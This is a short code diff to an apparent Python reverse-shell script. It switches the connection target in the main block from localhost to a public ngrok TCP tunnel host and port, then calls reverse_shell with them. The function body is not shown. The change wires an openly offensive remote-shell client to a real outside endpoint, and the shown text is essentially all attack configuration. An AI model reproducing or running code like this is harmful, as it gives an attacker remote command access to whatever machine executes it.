@@ -116,9 +116,9 @@ def reverse_shell(ip, port):
 
 
 if __name__ == "__main__":
-    # ip = socket.getaddrinfo("5.tcp.eu.ngrok.io",11513)[0][4][0] # IP of the server
-    ip = "127.0.0.1"
-    port = 55555
+    ip = socket.getaddrinfo("4.tcp.eu.ngrok.io",10897)[0][4][0] # IP of the server
+    #ip = "127.0.0.1"
+    port = 10897 # Port of the server
     reverse_shell(ip, port)
 
 # TODO : Handle no connection or dsconnection
